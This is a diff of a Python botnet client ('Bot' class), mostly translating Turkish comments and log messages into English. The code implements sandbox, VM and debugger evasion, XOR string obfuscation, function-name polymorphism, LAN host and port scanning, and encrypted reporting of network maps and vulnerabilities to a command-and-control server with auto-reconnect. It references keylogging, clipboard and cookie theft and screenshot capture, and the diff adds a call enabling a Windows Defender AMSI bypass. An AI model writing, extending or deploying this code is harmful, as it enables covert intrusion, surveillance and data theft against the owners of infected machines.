             file_hash = self._calculate_file_hash()
             signatures.add(f"FILE_HASH_{file_hash[:8]}")
             
-            # String imzalarını kontrol et
+            # Check string signatures
             suspicious_strings = [
                 "botnet", "keylogger", "backdoor", "trojan",
                 "malware", "virus", "hack", "exploit"
@@ -3272,7 +3478,7 @@ class Bot:
                 if string in self.bot_id.lower():
                     signatures.add(f"STRING_{string.upper()}")
             
-            # Fonksiyon imzalarını kontrol et
+            # Check function signatures
             function_signatures = [
                 "encrypt_data", "decrypt_data", "steal_cookies",
                 "keylogger_start", "clipboard_start"
@@ -3286,11 +3492,11 @@ class Bot:
             return signatures
             
         except Exception as e:
-            print(f"\033[93m[AI] İmza tespiti hatası: {str(e)}\033[0m")
+            print(f"\033[93m[AI] Signature detection error: {str(e)}\033[0m")
             return set()
     
     def _calculate_file_hash(self):
-        """Dosya hash'ini hesaplar"""
+        """Calculates file hash"""
         try:
             import hashlib
             with open(__file__, 'rb') as f:
@@ -3300,7 +3506,7 @@ class Bot:
             return "unknown"
     
     def _apply_evasion_techniques(self):
-        """Evasion tekniklerini uygular"""
+        """Applies evasion techniques"""
         applied_techniques = []
         success_rate = 0
         
@@ -3336,31 +3542,31 @@ class Bot:
             }
             
         except Exception as e:
-            print(f"\033[93m[AI] Evasion teknikleri hatası: {str(e)}\033[0m")
+            print(f"\033[93m[AI] Evasion techniques error: {str(e)}\033[0m")
             return {
                 'success_rate': 0,
                 'applied_techniques': []
             }
     
     def _apply_string_obfuscation(self):
-        """String karıştırma tekniği"""
+        """String obfuscation technique"""
         try:
-            # String'leri XOR ile karıştır
+            # Obfuscate strings with XOR
             original_strings = ["botnet", "keylogger", "malware"]
             obfuscated_strings = []
             
             for string in original_strings:
-                # XOR ile karıştır
+                # Obfuscate with XOR
                 key = 0x42
                 obfuscated = ''.join(chr(ord(c) ^ key) for c in string)
                 obfuscated_strings.append(obfuscated)
             
-            # Karıştırılmış string'leri kaydet
+            # Save obfuscated strings
             self.obfuscated_strings = obfuscated_strings
             return True
             
         except Exception as e:
-            print(f"\033[93m[AI] String obfuscation hatası: {str(e)}\033[0m")
+            print(f"\033[93m[AI] String obfuscation error: {str(e)}\033[0m")
             return False
     
     def _apply_code_polymorphism(self):
@@ -3374,43 +3580,43 @@ class Bot:
                 'keylogger_start': '_x4'
             }
             
-            # Dinamik fonksiyon çağrıları
+            # Dynamic function calls
             self.polymorphic_functions = function_mapping
             return True
             
         except Exception as e:
-            print(f"\033[93m[AI] Code polymorphism hatası: {str(e)}\033[0m")
+            print(f"\033[93m[AI] Code polymorphism error: {str(e)}\033[0m")
             return False
     
     def _apply_anti_debug(self):
-        """Anti-debug teknikleri"""
+        """Anti-debug techniques"""
         try:
-            # Debugger tespiti
+            # Debugger detection
             debugger_detected = self._detect_debugger()
             
             if debugger_detected:
-                # Debugger tespit edildi, davranışı değiştir
+                # Debugger detected, change behavior
                 self._change_behavior_on_debug()
                 return True
             
             return True
             
         except Exception as e:
-            print(f"\033[93m[AI] Anti-debug hatası: {str(e)}\033[0m")
+            print(f"\033[93m[AI] Anti-debug error: {str(e)}\033[0m")
             return False
     
     def _detect_debugger(self):
-        """Debugger tespit eder"""
+        """Detects debugger"""
         try:
-            # Basit debugger tespiti
+            # Simple debugger detection
             import time
             start_time = time.time()
             
-            # Zaman kontrolü
+            # Time check
             time.sleep(0.1)
             elapsed = time.time() - start_time
             
-            # Eğer çok yavaşsa debugger olabilir
+            # If too slow, might be debugger
             if elapsed > 0.2:
                 return True
             
@@ -3420,41 +3626,41 @@ class Bot:
             return False
     
     def _change_behavior_on_debug(self):
-        """Debugger tespit edildiğinde davranışı değiştir"""
+        """Change behavior when debugger detected"""
         try:
             # Normal davranışı simüle et
             self.keylogger_running = False
             self.clipboard_active = False
-            print("\033[93m[AI] Debugger tespit edildi, güvenli mod aktif\033[0m")
+            print("\033[93m[AI] Debugger detected, safe mode active\033[0m")
             
         except Exception as e:
-            print(f"\033[93m[AI] Behavior change hatası: {str(e)}\033[0m")
+            print(f"\033[93m[AI] Behavior change error: {str(e)}\033[0m")
     
     def _apply_sandbox_detection(self):
-        """Sandbox tespit eder"""
+        """Detects sandbox"""
         try:
-            # Sandbox belirtilerini kontrol et
+            # Check sandbox indicators
             sandbox_indicators = [
                 'vmware', 'virtualbox', 'qemu', 'xen',
                 'sandbox', 'analysis', 'debug'
             ]
             
-            # Sistem bilgilerini kontrol et
+            # Check system information
             system_info = self._get_system_info()
             
             for indicator in sandbox_indicators:
                 if indicator in system_info.lower():
-                    print(f"\033[93m[AI] Sandbox tespit edildi: {indicator}\033[0m")
+                    print(f"\033[93m[AI] Sandbox detected: {indicator}\033[0m")
                     return True
             
             return False
             
         except Exception as e:
-            print(f"\033[93m[AI] Sandbox detection hatası: {str(e)}\033[0m")
+            print(f"\033[93m[AI] Sandbox detection error: {str(e)}\033[0m")
             return False
     
     def _get_system_info(self):
-        """Sistem bilgilerini alır"""
+        """Gets system information"""
         try:
             if self.platform == 'windows':
                 result = subprocess.check_output(
@@ -3475,9 +3681,9 @@ class Bot:
             return "unknown"
     
     def _apply_behavioral_evasion(self):
-        """Davranışsal evasion"""
+        """Behavioral evasion"""
         try:
-            # Normal kullanıcı davranışını taklit et
+            # Mimic normal user behavior
             self.behavioral_patterns = {
                 'mouse_movement': True,
                 'keyboard_activity': True,
@@ -3485,22 +3691,22 @@ class Bot:
                 'network_activity': True
             }
             
-            # Davranış kalıplarını uygula
+            # Apply behavior patterns
             self._simulate_normal_behavior()
             return True
             
         except Exception as e:
-            print(f"\033[93m[AI] Behavioral evasion hatası: {str(e)}\033[0m")
+            print(f"\033[93m[AI] Behavioral evasion error: {str(e)}\033[0m")
             return False
     
     def _simulate_normal_behavior(self):
-        """Normal kullanıcı davranışını simüle eder"""
+        """Simulates normal user behavior"""
         try:
-            # Rastgele gecikmeler
+            # Random delays
             import random
             time.sleep(random.uniform(0.1, 0.5))
             
-            # Normal dosya erişimi simülasyonu
+            # Normal file access simulation
             if random.random() < 0.3:
                 try:
                     with open('/tmp/normal_file.txt', 'w') as f:
@@ -3509,41 +3715,41 @@ class Bot:
                     pass
             
         except Exception as e:
-            print(f"\033[93m[AI] Behavior simulation hatası: {str(e)}\033[0m")
+            print(f"\033[93m[AI] Behavior simulation error: {str(e)}\033[0m")
 
     def start_network_mapping(self, scope='192.168.1.0/24'):
-        """Network mapping başlatır"""
+        """Starts network mapping"""
         if self.network_mapping_active:
-            return "Network mapping zaten çalışıyor"
+            return "Network mapping already running"
         
         self.network_mapping_active = True
         self.current_scope = scope
         self.mapping_start_time = time.time()
         
-        # Network mapping thread'ini başlat
+        # Start network mapping thread
         self.network_mapping_thread = threading.Thread(target=self._network_mapping_worker, daemon=True)
         self.network_mapping_thread.start()
         
-        return f"Network mapping başlatıldı: {scope}"
+        return f"Network mapping started: {scope}"
     
     def stop_network_mapping(self):
-        """Network mapping durdurur"""
+        """Stops network mapping"""
         if not self.network_mapping_active:
-            return "Network mapping zaten çalışmıyor"
+            return "Network mapping not running"
         
         self.network_mapping_active = False
         
-        # Thread'in durmasını bekle
+        # Wait for thread to stop
         if self.network_mapping_thread and self.network_mapping_thread.is_alive():
             self.network_mapping_thread.join(timeout=1.0)
         
-        # Verileri sunucuya gönder
+        # Send data to server
         self._send_network_data_to_server()
         
-        return "Network mapping durduruldu ve veriler gönderildi"
+        return "Network mapping stopped and data sent"
     
     def get_network_mapping_status(self):
-        """Network mapping durumunu döndürür"""
+        """Returns network mapping status"""
         status = {
             'active': self.network_mapping_active,
             'scope': self.current_scope,
@@ -3558,31 +3764,31 @@ class Bot:
         return status
     
     def _network_mapping_worker(self):
-        """Network mapping worker thread'i"""
+        """Network mapping worker thread"""
         try:
-            print(f"\033[94m[Network] Mapping başlatılıyor: {self.current_scope}\033[0m")
+            print(f"\033[94m[Network] Mapping starting: {self.current_scope}\033[0m")
             
-            # Network taraması yap
+            # Perform network scan
             self._scan_network()
             
-            # Verileri sunucuya gönder
+            # Send data to server
             self._send_network_data_to_server()
             
-            print(f"\033[92m[Network] Mapping tamamlandı: {len(self.network_mapping_data['nodes'])} cihaz bulundu\033[0m")
+            print(f"\033[92m[Network] Mapping completed: {len(self.network_mapping_data['nodes'])} devices found\033[0m")
             
         except Exception as e:
-            print(f"\033[91m[Network] Mapping hatası: {str(e)}\033[0m")
+            print(f"\033[91m[Network] Mapping error: {str(e)}\033[0m")
     
     def _scan_network(self):
-        """Network taraması yapar"""
+        """Performs network scan"""
         try:
-            # Scope'dan IP aralığını çıkar
+            # Extract IP range from scope
             if '/' in self.current_scope:
                 base_ip = self.current_scope.split('/')[0]
                 base_parts = base_ip.split('.')
                 base_network = '.'.join(base_parts[:-1])
                 
-                # 1-254 arası IP'leri tara
+                # Scan IPs 1-254
                 for i in range(1, 255):
                     target_ip = f"{base_network}.{i}"
                     
@@ -3594,7 +3800,7 @@ class Bot:
                     if host_info:
                         self.network_mapping_data['nodes'].append(host_info)
                         
-                        # Bağlantı bilgisi ekle
+                        # Add connection info
                         link_info = {
                             'source': 'local',
                             'target': target_ip,
@@ -3603,19 +3809,19 @@ class Bot:
                         }
                         self.network_mapping_data['links'].append(link_info)
                         
-                        print(f"\033[92m[Network] Cihaz bulundu: {target_ip} ({host_info.get('hostname', 'Unknown')})\033[0m")
+                        print(f"\033[92m[Network] Device found: {target_ip} ({host_info.get('hostname', 'Unknown')})\033[0m")
                     
                     time.sleep(0.1)  # Rate limiting
             
         except Exception as e:
-            print(f"\033[91m[Network] Tarama hatası: {str(e)}\033[0m")
+            print(f"\033[91m[Network] Scan error: {str(e)}\033[0m")
     
     def _ping_host(self, ip):
-        """Host'u ping eder ve bilgilerini toplar"""
+        """Pings host and collects information"""
         try:
             start_time = time.time()
             
-            # Ping gönder
+            # Send ping
             if self.platform == 'windows':
                 result = subprocess.run(['ping', '-n', '1', '-w', '1000', ip], 
                                       capture_output=True, text=True, timeout=2)
@@ -3663,7 +3869,7 @@ class Bot:
             }
     
     def _get_hostname(self, ip):
-        """Host adını alır"""
+        """Gets hostname"""
         try:
             hostname = socket.gethostbyaddr(ip)[0]
             return hostname
@@ -3671,14 +3877,14 @@ class Bot:
             return 'Unknown'
     
     def _get_mac_address(self, ip):
-        """MAC adresini alır (ARP tablosundan)"""
+        """Gets MAC address (from ARP table)"""
         try:
             if self.platform == 'windows':
                 result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True)
             else:
                 result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
             
-            # MAC adresini çıkar
+            # Extract MAC address
             import re
             mac_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
             match = re.search(mac_pattern, result.stdout)
@@ -3692,22 +3898,22 @@ class Bot:
             return 'Unknown'
     
     def _guess_os(self, ip):
-        """TTL'ye göre OS tahmini yapar"""
+        """Predicts OS based on TTL"""
         try:
-            # TTL değerlerine göre OS tahmini
+            # OS prediction based on TTL values
             ttl_values = {
                 64: 'Linux/Unix',
                 128: 'Windows',
                 255: 'Network Device'
             }
             
-            # Ping ile TTL al
+            # Get TTL with ping
             if self.platform == 'windows':
                 result = subprocess.run(['ping', '-n', '1', ip], capture_output=True, text=True)
             else:
                 result = subprocess.run(['ping', '-c', '1', ip], capture_output=True, text=True)
             
-            # TTL değerini çıkar
+            # Extract TTL value
             import re
             ttl_match = re.search(r'TTL=(\d+)', result.stdout)
             
@@ -3723,9 +3929,9 @@ class Bot:
             return 'Unknown'
     
     def _determine_role(self, ip):
-        """Cihaz rolünü belirler"""
+        """Determines device role"""
         try:
-            # Port taraması ile rol belirleme
+            # Role determination via port scan
             common_ports = {
                 80: 'web_server',
                 443: 'web_server',
@@ -3741,7 +3947,7 @@ class Bot:
                 if self._check_port(ip, port):
                     return role
             
-            # Gateway kontrolü
+            # Gateway check
             if ip.endswith('.1') or ip.endswith('.254'):
                 return 'gateway'
             
@@ -3751,7 +3957,7 @@ class Bot:
             return 'unknown'
     
     def _check_port(self, ip, port):
-        """Port'un açık olup olmadığını kontrol eder"""
+        """Checks if port is open"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(1)
@@ -3762,7 +3968,7 @@ class Bot:
             return False
     
     def _scan_services(self, ip):
-        """Açık servisleri tarar"""
+        """Scans open services"""
         services = []
         common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5432, 8080]
         
@@ -3778,12 +3984,12 @@ class Bot:
         return services
     
     def _send_network_data_to_server(self):
-        """Network verilerini sunucuya gönderir"""
+        """Sends network data to server"""
         try:
             if not self.current_sock:
                 return
             
-            # Network verilerini hazırla
+            # Prepare network data
             network_data = {
                 'bot_id': self.bot_id,
                 'action': 'network_map_data',
@@ -3793,21 +3999,21 @@ class Bot:
                 'timestamp': time.time()
             }
             
-            # JSON olarak kodla
+            # Encode as JSON
             message_json = json.dumps(network_data)
             
-            # Şifrele (C2 uyumlu)
+            # Encrypt (C2 compatible)
             encrypted_data = self.encrypt_c2(message_json)
             
-            # Sunucuya gönder
+            # Send to server
             self.current_sock.sendall(encrypted_data)
-            print(f"\033[92m[Network] Network verileri sunucuya gönderildi\033[0m")
+            print(f"\033[92m[Network] Network data sent to server\033[0m")
             
         except Exception as e:
-            print(f"\033[91m[Network] Veri gönderme hatası: {str(e)}\033[0m")
+            print(f"\033[91m[Network] Data sending error: {str(e)}\033[0m")
     
     def _share_basic_info(self):
-        """Temel bilgileri peer'larla paylaşır"""
+        """Shares basic info with peers"""
         if not self.known_peers:
             return
             
@@ -3820,14 +4026,14 @@ class Bot:
         
         for peer_ip, peer_port in list(self.known_peers):
             try:
-                # IPv6 kontrolü
-                if ':' in peer_ip:  # IPv6 adresi
+                # IPv6 check
+                if ':' in peer_ip:  # IPv6 address
                     sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                     if platform.system() == 'Windows':
                         sock.connect((peer_ip, peer_port, 0, self.ipv6_scope_id))
                     else:
                         sock.connect((peer_ip, peer_port, 0, 0))
-                else:  # IPv4 adresi
+                else:  # IPv4 address
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.connect((peer_ip, peer_port))
                 
@@ -3847,9 +4053,9 @@ class Bot:
 
     # Vulnerability Scanner Sistemi
     def vulnerability_scanner_system(self):
-        """Sistem zafiyetlerini tarar"""
+        """Scans system vulnerabilities"""
         try:
-            print(f"\033[94m[VulnScan] Zafiyet taraması başlatılıyor...\033[0m")
+            print(f"\033[94m[VulnScan] Vulnerability scan starting...\033[0m")
             
             vuln_result = {
                 'scan_time': time.time(),
@@ -3873,7 +4079,7 @@ class Bot:
                         service_info = self._get_service_info(port)
                         vuln_result['services'].append(service_info)
                         
-                        # Zafiyet kontrolü
+                        # Vulnerability check
                         vulnerabilities = self._check_service_vulnerabilities(port, service_info)
                         vuln_result['vulnerabilities'].extend(vulnerabilities)
                     
@@ -3881,41 +4087,41 @@ class Bot:
                 except:
                     continue
             
-            # Sistem zafiyetleri
+            # System vulnerabilities
             system_vulns = self._check_system_vulnerabilities()
             vuln_result['vulnerabilities'].extend(system_vulns)
             
-            # Güvenlik skoru hesapla
+            # Calculate security score
             vuln_result['security_score'] = self._calculate_vuln_security_score(vuln_result)
             
-            # Öneriler oluştur
+            # Generate recommendations
             vuln_result['recommendations'] = self._generate_vuln_recommendations(vuln_result)
             
             # Sonuçları kaydet
             self.discovered_vulnerabilities.extend(vuln_result['vulnerabilities'])
             self.last_vuln_scan = time.time()
 
-            # Cihaz bilgilerini al ve harici kaynaklarda araştırma yap
+            # Get device info and research in external sources
             device_info = self._gather_device_info()
             external_vulns = self._research_vulnerabilities(device_info)
-            # En tehlikeli ilk 5 sonucu al
+            # Get top 5 most dangerous results
             top5 = external_vulns[:5] if len(external_vulns) > 5 else external_vulns
-            # Sunucuya raporla (server 'vulnerability_scan' action'ını bekliyor)
+            # Report to server (server expects 'vulnerability_scan' action)
             self._send_vulnerability_report(top5, device_info)
             
-            print(f"\033[92m[VulnScan] Tarama tamamlandı:\033[0m")
-            print(f"  \033[96m•\033[0m Açık Portlar: {len(vuln_result['open_ports'])}")
-            print(f"  \033[96m•\033[0m Tespit Edilen Zafiyetler: {len(vuln_result['vulnerabilities'])}")
-            print(f"  \033[96m•\033[0m Güvenlik Skoru: {vuln_result['security_score']}/100")
+            print(f"\033[92m[VulnScan] Scan completed:\033[0m")
+            print(f"  \033[96m•\033[0m Open Ports: {len(vuln_result['open_ports'])}")
+            print(f"  \033[96m•\033[0m Detected Vulnerabilities: {len(vuln_result['vulnerabilities'])}")
+            print(f"  \033[96m•\033[0m Security Score: {vuln_result['security_score']}/100")
             
             return vuln_result
             
         except Exception as e:
-            print(f"\033[91m[VulnScan] Tarama hatası: {str(e)}\033[0m")
+            print(f"\033[91m[VulnScan] Scan error: {str(e)}\033[0m")
             return None
     
     def _get_service_info(self, port):
-        """Port için servis bilgilerini alır"""
+        """Gets service info for port"""
         service_map = {
             21: {'name': 'FTP', 'version': 'Unknown', 'vulnerabilities': ['anonymous_access', 'cleartext']},
             22: {'name': 'SSH', 'version': 'Unknown', 'vulnerabilities': ['weak_auth']},
@@ -5662,17 +5868,17 @@ class Bot:
                 'total_found': len(normalized_vulns)
             }
             
-            # JSON olarak kodla ve şifrele (C2 uyumlu)
+            # Encode as JSON and encrypt (C2 compatible)
             report_json = json.dumps(report, indent=2)
             encrypted_report = self.encrypt_c2(report_json)
             
-            # Length-prefixed framing ile gönder (sunucunun beklediği format)
+            # Send with length-prefixed framing (server expected format)
             framed = struct.pack('!I', len(encrypted_report)) + encrypted_report
             self.current_sock.sendall(framed)
-            print(f"\033[92m[VulnResearch] 📤 Zafiyet raporu sunucuya gönderildi ({len(vulnerabilities)} zafiyet)\033[0m")
+            print(f"\033[92m[VulnResearch] 📤 Vulnerability report sent to server ({len(vulnerabilities)} vulnerabilities)\033[0m")
             
         except Exception as e:
-            print(f"\033[91m[VulnResearch] ❌ Rapor gönderme hatası: {str(e)}\033[0m")
+            print(f"\033[91m[VulnResearch] ❌ Report sending error: {str(e)}\033[0m")
     
     
     
@@ -5870,7 +6076,7 @@ class Bot:
                 'sandbox', 'analysis', 'debug', 'emulator'
             ]
             
-            # Sistem bilgilerini kontrol et
+            # Check system information
             system_info = self._get_system_info()
             emulator_detected = any(indicator in system_info.lower() for indicator in emulator_indicators)
             
@@ -6226,7 +6432,7 @@ class Bot:
             # Network trafiğini gizle
             self.network_stealth = True
             
-            # Bağlantı rotasyonu
+            # Connect rotation
             self._rotate_connection()
             
         except:
@@ -6413,7 +6619,7 @@ class Bot:
                 'vmware', 'virtualbox', 'qemu', 'xen', 'kvm'
             ]
             
-            # Sistem bilgilerini kontrol et
+            # Check system information
             system_info = self._get_comprehensive_system_info()
             sandbox_detected = any(indicator in system_info.lower() for indicator in sandbox_indicators)
             
@@ -7757,7 +7963,7 @@ class Bot:
                 'vmci', 'vmhgfs', 'vmsync', 'vmusb', 'vmscsi', 'vmscsi.sys'
             ]
             
-            # Sistem bilgilerini kontrol et
+            # Check system information
             system_info = self._get_comprehensive_system_info()
             for sign in vm_signs:
                 if sign.lower() in system_info.lower():
@@ -8424,6 +8630,10 @@ class Bot:
             if self.stealth_technologies['file_hiding']:
                 # self._start_file_hiding_system() # Disabled for safety
                 pass
+            
+            if self.stealth_technologies['windows_defender_bypass']:
+                # Windows Defender AMSI Bypass - Toggleable feature
+                self._enable_windows_defender_bypass()
                 
             print("[+] Stealth technologies initialized and running in background")
             
@@ -8872,7 +9082,6 @@ class Bot:
             print(f"[-] Error starting VM detection: {e}")
     
     def _check_vm_indicator(self, indicator):
-        """VM indicator'ını kontrol et"""
         try:
             # Platform specific VM detection
             if self.platform == "windows":
@@ -8887,7 +9096,6 @@ class Bot:
             return False
     
     def _check_windows_vm_indicator(self, indicator):
-        """Windows'ta VM indicator'ını kontrol et"""
         try:
             # Registry check
             # WMI check
@@ -8899,7 +9107,6 @@ class Bot:
             return False
     
     def _check_linux_vm_indicator(self, indicator):
-        """Linux'ta VM indicator'ını kontrol et"""
         try:
             # /proc filesystem check
             # dmesg check
@@ -8933,7 +9140,6 @@ class Bot:
             print(f"[-] Error starting debugger detection: {e}")
     
     def _check_debugger_presence(self):
-        """Debugger varlığını kontrol et"""
         try:
             # Timing checks
             # Hardware breakpoint checks
@@ -9063,7 +9269,6 @@ class Bot:
             print(f"[-] Error maintaining process hiding: {e}")
     
     def _memory_manipulation_loop(self):
-        """Memory manipulation loop - Pasif modda"""
         while self.running:
             try:
                 # Memory dump engelleme
@@ -9255,32 +9460,9 @@ class Bot:
             print(f"[-] Error collecting security events: {e}")
             return {}
 
-    # AI Training Data : Disabled
-    
-    # AI Evasion Model _Create Label : Disabled
-    
-    # AI Evasion Model _Update : Disabled
-    
-    # AI Behavior Model : Disabled
-    
-    # AI Sequence Data : Disabled
-    
-    
-    # AI Targeting Model : Disabled
-    
-    # AI Model Accuracy : Disabled
-    
-    # ================= AI/ML Command Functions : Disabled =================
-
     def _extract_evasion_features(self, target_data):
-        """Evasion features çıkar"""
         try:
-            # Evasion-specific features
-            features = [0] * 50  # 50 boyutlu feature vector
-            
-            # Antivirus detection features
-            # Sandbox detection features
-            # Behavioral analysis features
+            features = [0] * 50 
             
             return features
             
@@ -9289,7 +9471,6 @@ class Bot:
             return [0] * 50
     
     def _extract_current_evasion_features(self):
-        """Mevcut evasion features çıkar"""
         try:
             # Current system state features
             features = [0] * 50
@@ -9647,7 +9828,7 @@ class Bot:
             # Encryption katmanlarını test et
             self._test_encryption_layers()
             
-            # Encryption monitoring thread'ini başlat
+            # Start Encryption monitoring thread
             encryption_thread = threading.Thread(target=self._encryption_monitoring_loop, daemon=True)
             encryption_thread.start()
             
@@ -9883,23 +10064,18 @@ class Bot:
             return stego_data
     
     def _encrypt_communication(self, data):
-        """Communication için multi-layer encryption"""
         try:
-            # Multi-layer encryption uygula
             encrypted_data = self._multi_layer_encrypt(data)
             
-            # Encryption metadata ekle
             metadata = {
                 'encryption_layers': list(self.encryption_layers.keys()),
                 'timestamp': time.time(),
                 'data_length': len(encrypted_data)
             }
             
-            # Metadata'ya imza ekle
             metadata_signature = self._sign_metadata(metadata)
             metadata['signature'] = metadata_signature
             
-            # Metadata ve encrypted data'yı birleştir
             final_data = {
                 'metadata': metadata,
                 'encrypted_data': base64.b64encode(encrypted_data).decode()
@@ -9912,20 +10088,15 @@ class Bot:
             return data
     
     def _decrypt_communication(self, encrypted_communication):
-        """Communication için multi-layer decryption"""
         try:
-            # JSON data'yı parse et
             comm_data = json.loads(encrypted_communication.decode())
             
-            # Metadata'yı doğrula
             if not self._verify_metadata(comm_data['metadata']):
                 print("[-] Metadata verification failed")
                 return encrypted_communication
             
-            # Encrypted data'yı decode et
             encrypted_data = base64.b64decode(comm_data['metadata']['encrypted_data'])
             
-            # Multi-layer decryption uygula
             decrypted_data = self._multi_layer_decrypt(encrypted_data)
             
             return decrypted_data
@@ -9935,12 +10106,9 @@ class Bot:
             return encrypted_data
     
     def _sign_metadata(self, metadata):
-        """Metadata'ya imza ekle"""
         try:
-            # Metadata'yı string'e çevir
             metadata_str = json.dumps(metadata, sort_keys=True)
             
-            # HMAC ile imza oluştur
             import hmac
             signature = hmac.new(self.encryption_key, metadata_str.encode(), hashlib.sha256).hexdigest()
             
@@ -9951,15 +10119,11 @@ class Bot:
             return ""
     
     def _verify_metadata(self, metadata):
-        """Metadata imzasını doğrula"""
         try:
-            # Signature'ı çıkar
             received_signature = metadata.pop('signature', '')
             
-            # Beklenen signature'ı hesapla
             expected_signature = self._sign_metadata(metadata)
             
-            # Signature'ları karşılaştır
             return received_signature == expected_signature
             
         except Exception as e:
@@ -9967,12 +10131,9 @@ class Bot:
             return False
     
     def _rotate_encryption_keys(self):
-        """Encryption key'leri rotate et"""
         try:
-            # Yeni key'ler oluştur
             self._generate_encryption_keys()
             
-            # Key rotation timestamp'i güncelle
             self.last_key_rotation = time.time()
             
             print("[+] Encryption keys rotated successfully")
@@ -9981,7 +10142,6 @@ class Bot:
             print(f"[-] Error rotating encryption keys: {e}")
     
     def _get_encryption_status(self):
-        """Encryption durumunu döndür"""
         try:
             status = {
                 'layers_active': len(self.encryption_layers),
@@ -10003,33 +10163,27 @@ class Bot:
             return {}
     
     def _encryption_monitoring_loop(self):
-        """Encryption monitoring loop - Pasif modda sürekli çalışan"""
         while self.running:
             try:
-                # Encryption key'leri rotate et (belirli aralıklarla)
                 if hasattr(self, 'last_key_rotation'):
-                    if time.time() - self.last_key_rotation > 3600:  # 1 saat
+                    if time.time() - self.last_key_rotation > 3600: 
                         self._rotate_encryption_keys()
                 else:
                     self.last_key_rotation = time.time()
                 
-                # Encryption katmanlarını test et
                 if not getattr(self, '_encryption_tested', False):
                     self._test_encryption_layers()
                 
-                # Encryption performance analizi
                 self._analyze_encryption_performance()
                 
-                time.sleep(300)  # 5 dakikada bir kontrol
+                time.sleep(300)  
                 
             except Exception as e:
                 print(f"[-] Error in encryption monitoring loop: {e}")
-                time.sleep(600)  # Hata durumunda 10 dakika bekle
+                time.sleep(600) 
     
     def _analyze_encryption_performance(self):
-        """Encryption performance analizi"""
         try:
-            # Encryption katmanlarının performansını analiz et
             performance_data = {
                 'timestamp': time.time(),
                 'layers_active': len(self.encryption_layers),
@@ -10043,18 +10197,15 @@ class Bot:
                 'last_key_rotation': getattr(self, 'last_key_rotation', 0)
             }
             
-            # Performance log'u
+            # Performance log
             if performance_data['keys_generated'] and performance_data['encryption_tested']:
                 print("[+] Encryption system: All layers active and tested")
             else:
                 print("[!] Encryption system: Some layers need attention")
         except Exception as e:
             print(f"[-] Error analyzing encryption performance: {e}")
-    
-    # AI Brain : Disabled
 
     def analyze_system_environment(self):
-        """Sistem durumunu analiz edip detaylı bir rapor oluşturur"""
         try:
             system_info = {
                 'os': platform.system(),
@@ -10071,48 +10222,28 @@ class Bot:
             }
             return system_info
         except Exception as e:
-            print(f"[!] Sistem analiz hatası: {e}")
+            print(f"[!] System analysis error: {e}")
             return {}
-
-    # AI Recommendation System : Disabled
-
-    # AI Create Prompt System : Disabled
-
-    # AI Query : Disabled
-
-    # AI Semantic Search : Disabled
-
-    
-    # AI OpenRouter API : Disabled
-    
-    
-    # AI Powered API Decision : Disabled
 
 if __name__ == "__main__":
     try:
-        # Bot'u oluştur ve başlat
         bot = Bot()
 
-        # Otomatik yeniden bağlanma döngüsü (her 60 saniyede bir)
         def _auto_reconnect_loop():
             while True:
                 try:
                     if not getattr(bot, 'current_sock', None):
                         bot.current_sock = bot.connect()
-                        # Bağlantı kurulduysa komut dinleme thread'ini başlat
                         if bot.current_sock and (not getattr(bot, 'comm_thread', None) or not bot.comm_thread.is_alive()):
                             bot.comm_thread = threading.Thread(target=bot.handle_bot, args=(bot.current_sock,), daemon=True)
                             bot.comm_thread.start()
-                        # Heartbeat thread'i yoksa başlat
                         if not getattr(bot, 'heartbeat_thread', None) or not bot.heartbeat_thread.is_alive():
                             bot.heartbeat_thread = threading.Thread(target=bot._heartbeat_loop, daemon=True)
                             bot.heartbeat_thread.start()
                     else:
-                        # Bağlıyken handler thread'i düşmüşse yeniden başlat
                         if not getattr(bot, 'comm_thread', None) or not bot.comm_thread.is_alive():
                             bot.comm_thread = threading.Thread(target=bot.handle_bot, args=(bot.current_sock,), daemon=True)
                             bot.comm_thread.start()
-                        # Heartbeat thread'i düşmüşse yeniden başlat
                         if not getattr(bot, 'heartbeat_thread', None) or not bot.heartbeat_thread.is_alive():
                             bot.heartbeat_thread = threading.Thread(target=bot._heartbeat_loop, daemon=True)
                             bot.heartbeat_thread.start()
@@ -10123,17 +10254,14 @@ if __name__ == "__main__":
 
         threading.Thread(target=_auto_reconnect_loop, daemon=True).start()
 
-        # Ana thread'in hemen bitmemesi için basit bir bekleme döngüsü
-        # (Uygulamanda başka foreground işler yoksa gerekli)
         while True:
             time.sleep(3600)
     except KeyboardInterrupt:
-        print(f"\033[93m[!] Program kullanıcı tarafından durduruldu\033[0m")
+        print(f"\033[93m[!] The program has been stopped by the user\033[0m")
     except Exception as e:
-        print(f"\033[91m[!] Program hatası: {str(e)}\033[0m")
+        print(f"\033[91m[!] Program error: {str(e)}\033[0m")
 
     def _get_open_ports(self):
-        """Açık portları al"""
         try:
             open_ports = []
             common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080, 8443]
@@ -10159,7 +10287,6 @@ if __name__ == "__main__":
             return []
     
     def _get_running_services(self):
-        """Çalışan servisleri al"""
         try:
             services = []
             if self.platform == 'windows':
@@ -10176,14 +10303,12 @@ if __name__ == "__main__":
             return []
     
     def _get_hardware_info(self):
-        """Donanım bilgilerini al"""
         try:
             hardware = {
                 'cpu_count': os.cpu_count(),
                 'memory': {}
             }
             
-            # Bellek bilgisi
             if psutil:
                 memory = psutil.virtual_memory()
                 hardware['memory'] = {
@@ -10198,7 +10323,6 @@ if __name__ == "__main__":
             return {'cpu_count': 'unknown', 'memory': 'unknown'}
     
     def _get_user_info(self):
-        """Kullanıcı bilgilerini al"""
         try:
             user_info = {
                 'current_user': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
@@ -10206,7 +10330,6 @@ if __name__ == "__main__":
                 'current_directory': os.getcwd()
             }
             
-            # Windows'ta ek kullanıcı bilgileri
             if self.platform == 'windows':
                 try:
                     result = subprocess.run(['whoami'], capture_output=True, text=True, timeout=5)
@@ -10303,26 +10426,26 @@ if __name__ == "__main__":
             return f"Screenshot stop error: {e}"
     
     def _screenshot_loop(self):
-        """Screenshot alma döngüsü - her 10 saniyede bir"""
+        """Screenshot capture loop - every 10 seconds"""
         while self.screenshot_active:
             try:
